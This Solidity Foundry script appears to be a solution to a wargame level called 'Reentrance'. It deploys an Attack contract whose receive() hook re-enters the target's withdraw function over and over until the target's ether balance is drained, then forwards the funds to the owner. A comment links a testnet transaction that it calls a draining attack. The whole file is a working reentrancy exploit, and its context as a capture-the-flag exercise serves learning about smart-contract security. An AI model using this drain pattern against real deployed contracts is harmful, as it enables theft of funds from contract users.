// SPDX-License-Identifier: MIT

pragma solidity ^0.6.0;

import "../src/Reentrance.sol";
import "forge-std/Script.sol";
import "forge-std/console2.sol";

contract Attack {
    address payable public owner;
    Reentrance public instance = Reentrance(0xfbc4F4BB03e995f5260741Ea7fdb5f9b8AEcC1AB);

    receive() external payable {
        if (address(instance).balance >= 0.0001 ether) {
            this.attack();
        }
    }

    constructor(address payable _owner) public payable {
        owner = _owner;
        instance.donate{value: 0.0001 ether}(address(this));
    }

    modifier onlyOwner() {
        require(msg.sender == owner, "only owner");
        _;
    }

    function attack() external payable {
        instance.withdraw(0.0001 ether);
    }

    function withdraw() external onlyOwner {
        (bool success,) = owner.call{value: address(this).balance}("");
        require(success, "transfer failed");
    }
}

contract Level10ReentranceSolution is Script {
    Reentrance public instance = Reentrance(0xfbc4F4BB03e995f5260741Ea7fdb5f9b8AEcC1AB);

    function run() external {
        vm.startBroadcast(vm.envUint("PRIVATE_KEY"));
        Attack attack = new Attack{value: 0.001 ether}(payable(vm.envAddress("MY_ADDRESS")));
        console.log("donated amount:", instance.balanceOf(address(attack)));
        console.log("attack balance before:", address(instance).balance);
        attack.attack();
        attack.withdraw();
        console.log("attack balance after:", address(attack).balance);
        console.log("donated amount:", instance.balanceOf(address(attack)));

        vm.stopBroadcast();
    }
}

// example draining attack:https://sepolia.etherscan.io/tx/0x028f2750c4120a67c23c05eb8ac2db9892e4ec892a0caa2ee044ffe719b82d4f
